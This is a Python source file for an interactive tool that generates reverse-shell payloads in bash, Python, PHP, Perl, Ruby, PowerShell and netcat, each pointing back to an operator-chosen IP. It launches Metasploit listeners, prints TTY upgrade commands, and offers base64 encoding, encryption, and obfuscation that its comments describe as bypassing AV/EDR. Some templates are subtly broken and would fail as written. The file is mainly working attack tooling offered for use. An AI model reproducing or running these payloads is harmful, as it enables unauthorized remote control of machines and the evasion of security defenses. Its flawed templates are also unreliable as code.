import os
import socket
import base64
import re
import random
import string
import subprocess
import platform

# Reverse shell templates mapped by numbers
reverse_shells = {
    1: "bash",
    2: "python",
    3: "php",
    4: "perl",
    5: "ruby",
    6: "powershell",
    7: "nc",
    8: "udp_bash",
    9: "http_python",
    10: "icmp_python",
}

# Reverse shell templates
shell_templates = {
    "bash": "bash -i >& /dev/tcp/{}/{} 0>&1",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "php": "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "ruby": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{}\",\"{}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
    "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{}\",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    "nc": "nc -e /bin/sh {} {}",
    "udp_bash": "bash -i >& /dev/udp/{}/{} 0>&1",
    "http_python": "python3 -c 'import urllib.request; response = urllib.request.urlopen(\"http://{}/{}\")'",
    "icmp_python": "python3 -c 'import socket; sock=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP); sock.sendto(b\"ICMP payload\", (\"{}\", 0))'",
}

# TTY Shell Upgrade commands mapped by numbers
tty_commands = {
    1: "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    2: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    3: "script /dev/null -c /bin/bash",
    4: "socat file:`tty`,raw,echo=0 tcp-listen:{}"
}

# Encryption methods mapped by string
encryption_methods = {
    "aes": "openssl enc -aes-256-cbc -a -salt -in {} -out {} -k {}",
    "rsa": "openssl rsautl -encrypt -inkey public_key.pem -pubin -in {} -out {}"
}

# Function to detect OS type
def detect_os():
    detected_os = platform.system().lower()
    if 'windows' in detected_os:
        return 'windows'
    elif 'linux' in detected_os:
        return 'linux'
    elif 'darwin' in detected_os:
        return 'macos'
    else:
        return 'unknown'

# Display available reverse shell languages
def display_languages():
    print("\nAvailable reverse shells:")
    for idx, lang in reverse_shells.items():
        print(f"{idx}. {lang}")
    print()

# Get reverse shell based on user choice
def get_reverse_shell_choice(choice):
    try:
        return reverse_shells[int(choice)]
    except (KeyError, ValueError):
        print("[-] Invalid choice. Please enter a valid number.")
        return None

# Validate IP address input
def validate_ip(ip):
    pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    return pattern.match(ip) and all(0 <= int(octet) < 256 for octet in ip.split('.'))

# Validate port input
def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

# Set up listener based on shell type
def setup_listener(ip, port, lang, use_proxy=False):
    if use_proxy:
        print("[*] Setting up a proxy listener (via proxychains)...")
        if lang == "nc":
            os.system(f"proxychains nc -lvnp {port}")
        else:
            os.system(f"proxychains msfconsole -q -x 'use multi/handler; set payload {get_msf_payload(lang)}; set LHOST {ip}; set LPORT {port}; run'")
    else:
        print("\n[*] Setting up a listener...")
        if lang == "nc":
            os.system(f"nc -lvnp {port}")
        else:
            payload = get_msf_payload(lang)
            os.system(f'msfconsole -q -x "use multi/handler; set payload {payload}; set LHOST {ip}; set LPORT {port}; run"')

# Map reverse shell language to Metasploit payloads
def get_msf_payload(lang):
    payload_map = {
        "bash": "cmd/unix/reverse_bash",
        "python": "python/shell_reverse_tcp",
        "powershell": "windows/meterpreter/reverse_tcp",
        "php": "php/meterpreter_reverse_tcp",
        "perl": "cmd/unix/reverse_perl",
        "ruby": "ruby/shell_reverse_tcp",
        "nc": "cmd/unix/reverse_netcat",
        "java": "java/meterpreter/reverse_tcp",
        "udp_bash": "cmd/unix/reverse_bash"
    }
    return payload_map.get(lang, "cmd/unix/reverse_bash")

# TTY shell upgrade
def upgrade_to_tty():
    print("\n[*] Available TTY upgrade methods:")
    for idx, cmd in tty_commands.items():
        print(f"{idx}. {cmd.split()[0]}")

    choice = input("[*] Choose TTY upgrade method: ").strip()
    try:
        method = int(choice)
        if method in tty_commands:
            print(f"\n[+] Run the following command on your reverse shell:\n")
            print(tty_commands[method])
        else:
            print("[-] Invalid choice.")
    except ValueError:
        print("[-] Invalid input, please enter a number.")

# Generate reverse shell
def generate_reverse_shell(ip, port, lang, encode=False, obfuscate=False, encryption=None):
    if lang in shell_templates:
        shell = shell_templates[lang].format(ip, port)

        # Apply encryption if specified
        if encryption:
            shell = encrypt_shell(shell, method=encryption)
            print(f"\n[+] Encrypted Reverse Shell (method: {encryption}):\n")
        
        # Apply obfuscation if selected
        elif obfuscate:
            shell = obfuscate_shell(shell)
            print(f"\n[+] Obfuscated Reverse Shell for {lang}:\n")

        # Apply Base64 encoding if selected
        elif encode:
            shell = base64_encode(shell)
            print(f"\n[+] Base64 Encoded Reverse Shell for {lang}:\n")
        else:
            print(f"\n[+] Generated Reverse Shell for {lang}:\n")
        
        print(shell)
        print("\n")
    else:
        print("[-] Invalid shell language selection.")

# Base64 encoding
def base64_encode(shell):
    return base64.b64encode(shell.encode()).decode()

# Shell obfuscation techniques for bypassing AV/EDR
def obfuscate_shell(shell):
    obfuscated = ''.join(random.choice(string.ascii_letters) for _ in range(10)) + shell
    return ''.join([f"\\{x}" if random.random() > 0.7 else x for x in obfuscated])

# Perform AES/RSA encryption on the shell payload
def encrypt_shell(shell, method="aes", password="password"):
    input_file = "temp_payload.txt"
    output_file = "encrypted_payload.enc"
    with open(input_file, "w") as f:
        f.write(shell)
    
    if method in encryption_methods:
        encryption_cmd = encryption_methods[method].format(input_file, output_file, password)
        os.system(encryption_cmd)
        with open(output_file, "r") as f:
            encrypted_data = f.read()
        return encrypted_data
    else:
        print("[-] Encryption method not supported.")
        return shell

# Main program flow
def main():
    print(f"[*] Detected local OS: {detect_os().capitalize()}")

    while True:
        try:
            # Input for target IP and port
            ip = input("[*] Enter target IP: ")
            if not validate_ip(ip):
                print("[!] Invalid IP address.")
                continue

            port = input("[*] Enter target port: ")
            if not validate_port(port):
                print("[!] Invalid port number.")
                continue

            # Display available reverse shells
            display_languages()
            lang_choice = input("[*] Enter the reverse shell language/type (number): ").strip()
            lang = get_reverse_shell_choice(lang_choice)
            if not lang:
                continue

            # Base64 encoding option
            encode_choice = input("[*] Do you want to Base64 encode the shell? (y/n): ").lower()
            encode = True if encode_choice == 'y' else False

            # Obfuscation option
            obfuscate_choice = input("[*] Do you want to obfuscate the shell? (y/n): ").lower()
            obfuscate = True if obfuscate_choice == 'y' else False

            # Encryption option
            encryption_choice = input("[*] Do you want to encrypt the shell communication (AES/RSA)? (aes/rsa/none): ").lower()
            encryption = encryption_choice if encryption_choice in ["aes", "rsa"] else None

            # Generate the reverse shell
            generate_reverse_shell(ip, port, lang, encode, obfuscate, encryption=encryption)

            # Option to upgrade shell to TTY
            tty_upgrade_choice = input("[*] Do you want to upgrade the shell to TTY? (y/n): ").lower()
            if tty_upgrade_choice == 'y':
                upgrade_to_tty()

            # Ask to generate another shell
            again = input("[*] Generate another reverse shell? (y/n): ").lower()
            if again != 'y':
                print("[*] Exiting...")
                break

        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break

if __name__ == "__main__":
    main()
